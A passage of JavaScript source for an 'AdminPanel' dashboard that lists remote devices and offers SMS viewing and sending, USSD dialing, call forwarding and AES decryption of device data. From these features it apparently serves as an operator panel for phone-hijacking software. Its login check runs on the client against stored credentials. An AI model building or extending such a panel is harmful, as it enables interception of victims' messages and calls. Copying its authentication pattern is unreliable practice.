            setTimeout(() => {
                this.loadDevices();
            }, 10000);

        } catch (error) {
            console.error("Error checking online status:", error);
            alert("An unexpected error occurred.");
        }
    }

    serialFilter() {
        const input = document.getElementById("search");
        const container = document.getElementById("deviceContainer"); // cards yahi render ho rahe hain

        input.addEventListener("keyup", () => {
            const filter = input.value.trim().toLowerCase();

            // Select all device cards inside container
            const cards = container.querySelectorAll(".device-card");

            cards.forEach(card => {
                const serial = card.getAttribute("data-serial").toLowerCase();

                // Show/hide based on filter
                card.style.display = serial.includes(filter) ? "" : "none";
            });
        });
    }

    serialFilterForData() {
        const input = document.getElementById("search");
        const container = document.getElementById("list"); // cards yahi render ho rahe hain

        input.addEventListener("keyup", () => {
            const filter = input.value.trim().toLowerCase();

            // Select all device cards inside container
            const cards = container.querySelectorAll(".device-card");

            cards.forEach(card => {
                const serial = card.getAttribute("data-serial").toLowerCase();

                // Show/hide based on filter
                card.style.display = serial.includes(filter) ? "" : "none";
            });
        });
    }

    async likeDevice(deviceid, likeStatus) {
        if (deviceid) {
            const userRef = this.database.ref(`${this.refUserKey}/${deviceid}`);

            const currentStatus = likeStatus === true || likeStatus === "true";
            const newStatus = !currentStatus;

            await userRef.update({
                like: newStatus
            });
        }
    }

    async deleteDevice(deviceKey) {
        if (!confirm('ARE YOU SURE YOU WANT TO DELETE THIS DEVICE?')) {
            return;
        }

        this.database.ref(`${this.refUserKey}/${deviceKey}`).remove()
            .then(() => {
                alert("DEVICE DELETED SUCCESSFULLY!");
            })
            .catch((error) => {
                console.error("Error deleting device:", error);
                alert("FAILED TO DELETE DEVICE: " + error.message);
            });
    }

	async saveLoginDevice() {

	    const deviceId = crypto.randomUUID(); 
	    const ip = await this.getIP();

	    const payload = {
	        deviceName: this.getCleanDeviceName(),
	        browser: this.getBrowser(),
	        platform: navigator.platform,
	        ip: ip,
	        loginTime: Date.now(),
	        logoutTime: null,
	        active: true
	    };


        await this.database.ref(`${this.refKey}sessions/${deviceId}`).set(payload).catch(() => { });

	    localStorage.setItem("adminSessionId", deviceId);
	}

	getCleanDeviceName() {
	    const ua = navigator.userAgent;

	    let device = "Unknown Device";
	    let browser = "Unknown Browser";

	    // Browser detection
	    if (ua.includes("Chrome")) browser = "Chrome";
	    else if (ua.includes("Firefox")) browser = "Firefox";
	    else if (ua.includes("Safari")) browser = "Safari";
	    else if (ua.includes("Edge")) browser = "Edge";

	    // Device / OS detection
	    if (ua.includes("Windows")) device = "Windows PC";
	    else if (ua.includes("Mac")) device = "Mac";
	    else if (ua.includes("Linux")) device = "Linux PC";
	    else if (ua.includes("Android")) device = "Android";
	    else if (ua.includes("iPhone") || ua.includes("iPad")) device = "iOS";

	    return `${device} (${browser})`;
	}

	async getIP() {
	    const res = await fetch("https://api.ipify.org?format=json");
	    const data = await res.json();
	    return data.ip;
	}

	getBrowser() {
	    const ua = navigator.userAgent;
	    if (ua.includes("Chrome")) return "Chrome";
	    if (ua.includes("Firefox")) return "Firefox";
	    if (ua.includes("Safari")) return "Safari";
	    if (ua.includes("Edge")) return "Edge";
	    return "Unknown";
	}

    async handleLogin() {

        const username = document.getElementById('username').value;

        const password = document.getElementById('password').value;

        if (!username && !password) {
            alert("Please enter User Name and Password to access this panel.");
        } else {

            const adminRef = this.database.ref(this.refAdminKey);
            const snapshot = await adminRef.once('value');

            if (snapshot.exists()) {
                const adminData = snapshot.val();

                if (username === adminData.name) {

                    if (password === adminData.pass) {

					    // Save device/session info
					    await this.saveLoginDevice();

                        localStorage.setItem("adminLoggedIn", "true");

                        window.location.href = "dashboard.html";

                    } else {
                        alert("ACCESS DENIED: PLEASE ENTER A CORRECT PASSWORD!");
                    }

                } else {
                    alert("ACCESS DENIED: PLEASE ENTER A CORRECT USER NAME!");
                }

            }

        }


    }

	async logoutAdmin() {
	    const sessionId = localStorage.getItem("adminSessionId");
	    if (!sessionId) return;

	    try {
	        // Update session in Firebase
	        await this.database.ref(`${this.refKey}sessions/${sessionId}`).update({
	            active: false,
	            logoutTime: Date.now()
	        });

	        // Clear local storage
	        localStorage.removeItem("adminLoggedIn");
	        localStorage.removeItem("adminSessionId");

	        // Redirect to login page
	        window.location.href = "index.html";
	    } catch (err) {
	        console.error("Logout error:", err);
	        alert("Error logging out. Try again.");
	    }
	}


	async checkLogin() {
	    const sessionId = localStorage.getItem("adminSessionId");

	    // Page is login page → skip
	    if (window.location.pathname.endsWith("index.html")) return;

	    if (!sessionId) {
	        window.location.href = "index.html";
	        return;
	    }

	    const snap = await this.database.ref(`${this.refKey}sessions/${sessionId}`).once("value");

	    if (!snap.exists()) {
	        this.forceLogout();
	        return;
	    }

	    const data = snap.val();

		if (!data.active || data.logoutTime) {
	        this.forceLogout();
	        return;
	    }

	    // Update last_active on each page load
	    await this.database.ref(`${this.refKey}sessions/${sessionId}`).update({
	        lastActive: Date.now()
	    });
	}

	forceLogout() {
	    localStorage.removeItem("adminSessionId");
	    localStorage.removeItem("adminLoggedIn");
	    window.location.href = "index.html";
	}

    showUSSDDialingCard() {

        document.getElementById('viewDataCard').style = "display: none";

        document.getElementById('callForwardingCard').style = "display: none";
        document.getElementById('viewSMSCard').style = "display: none";
        document.getElementById('sendSMSCard').style = "display: none";
        document.getElementById('ussdDialingCard').style = "display: block";

    }

    showCallForwardingCard() {
        document.getElementById('callForwardingCard').style = "display: block";
        document.getElementById('viewSMSCard').style = "display: none";
        document.getElementById('sendSMSCard').style = "display: none";
        document.getElementById('ussdDialingCard').style = "display: none";

        document.getElementById('viewDataCard').style = "display: none";
    }

    showSendMessageCard() {

        document.getElementById('viewDataCard').style = "display: none";

        document.getElementById('callForwardingCard').style = "display: none";
        document.getElementById('viewSMSCard').style = "display: none";
        document.getElementById('sendSMSCard').style = "display: block";
        document.getElementById('ussdDialingCard').style = "display: none";

    }

    showViewDataCard() {

        document.getElementById('viewDataCard').style = "display: block";

        document.getElementById('callForwardingCard').style = "display: none";
        document.getElementById('viewSMSCard').style = "display: none";
        document.getElementById('sendSMSCard').style = "display: none";
        document.getElementById('ussdDialingCard').style = "display: none";

    }

    showMessageCard() {

        document.getElementById('viewDataCard').style = "display: none";
        document.getElementById('callForwardingCard').style = "display: none";
        document.getElementById('sendSMSCard').style = "display: none";
        document.getElementById('ussdDialingCard').style = "display: none";

        document.getElementById('viewSMSCard').style = "display: block";
    }

    decryptData(encryptedBase64) {
        try {
            if (!encryptedBase64) return "";

            const keyStr = this.decryptKey;

            const key = CryptoJS.enc.Utf8.parse(keyStr.substring(0, 16));
            const rawData = CryptoJS.enc.Base64.parse(encryptedBase64);
            const rawBytes = CryptoJS.enc.Base64.stringify(rawData);
            const bytes = CryptoJS.enc.Base64.parse(rawBytes);
            const words = CryptoJS.enc.Base64.parse(encryptedBase64);
            const arr = CryptoJS.enc.Base64.parse(encryptedBase64).toString(CryptoJS.enc.Latin1);
            const buffer = Uint8Array.from(arr, c => c.charCodeAt(0));
            const iv = CryptoJS.lib.WordArray.create(buffer.slice(0, 16));
            const cipherText = CryptoJS.lib.WordArray.create(buffer.slice(16));
            const decrypted = CryptoJS.AES.decrypt({ ciphertext: cipherText }, key, {
                iv: iv,
                mode: CryptoJS.mode.CBC,
                padding: CryptoJS.pad.Pkcs7
            });
            return CryptoJS.enc.Utf8.stringify(decrypted);
        } catch (e) {
            console.log(e);
            return "[decryption failed]";
        }
    }


    formatDate(dateString) {
        // dateString = "2025-09-19 15:25:34"
        let parts = dateString.split(/[- :]/);
        // [2025, 09, 19, 15, 25, 34]
        let year = parseInt(parts[0]);
        let month = parseInt(parts[1]) - 1; // JS month 0-based
        let day = parseInt(parts[2]);
        let hour = parseInt(parts[3]);
        let minute = parseInt(parts[4]);
        let second = parseInt(parts[5]);

        let date = new Date(year, month, day, hour, minute, second);

        // Format 1: Full GMT style
        let fullFormat = date.toLocaleString("en-US", {
            timeZone: "Asia/Kolkata",
            weekday: "short",
            year: "numeric",
            month: "short",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: false,
            timeZoneName: "short"
        });

        // Format 2: Short readable style
        let shortFormat = date.toLocaleString("en-US", {
            timeZone: "Asia/Kolkata",
            month: "short",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: true
        });
        // 👉 Example: "Sep 20, 03:58:40 PM"

        return { fullFormat, shortFormat };
    }

    formatTimestamp(timestamp) {
        // Convert milliseconds to Date object
        let date = new Date(timestamp);

        // Short readable style
        let shortFormat = date.toLocaleString("en-US", {
            timeZone: "Asia/Kolkata",
            month: "short",
            day: "2-digit",
            hour: "2-digit",
            minute: "2-digit",
            second: "2-digit",
            hour12: true
        });

        return shortFormat; // 👉 Example: "Sep 20, 03:58:40 PM"
    }


    splitDeviceNameAndVerison(str) {
        str = str.trim();

        // last number extract
        const match = str.match(/(\d+)\s*$/);

        if (!match) {
            return { name: str, number: null };
        }

        const number = Number(match[1]);

        // name = full string minus last number
        const name = str.replace(/\d+\s*$/, "").trim();

        return { name, number };
    }

	showProgressBar() {
	    document.getElementById("loading").style = "display : flex";

	    const progressEl = document.getElementById("progressValue");
	    this.currentProgress = 0;

	    this.progressInterval = setInterval(() => {
	        // Increase randomly but never exceed 90%
	        this.currentProgress += Math.floor(Math.random() * 8) + 1; // 1–8%

	        if (this.currentProgress > 90) this.currentProgress = 90;

	        progressEl.textContent = this.currentProgress + "%";

	    }, 300);
	}

	finishProgressBar() {
	    clearInterval(this.progressInterval);
	    this.currentProgress = 100;
	    document.getElementById("progressValue").textContent = "100%";

        setTimeout(() => {
	    	document.getElementById("loading").style = "display : none";
        }, 2000);

	}

    loadDataUsage() {
        const dataUsage = document.getElementById('dataUsage');

        if (dataUsage) {

            // Simulate data usage monitoring
            setInterval(() => {
                const sent = Math.floor(Math.random() * 1000) + ' KB';
                const received = Math.floor(Math.random() * 2000) + ' KB';
                document.getElementById('dataUsage').textContent = `SEND: ${sent} | RECV: ${received}`;
            }, 5000);
        }
    }

}


// Initialize the application when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    window.adminPanel = new AdminPanel();
});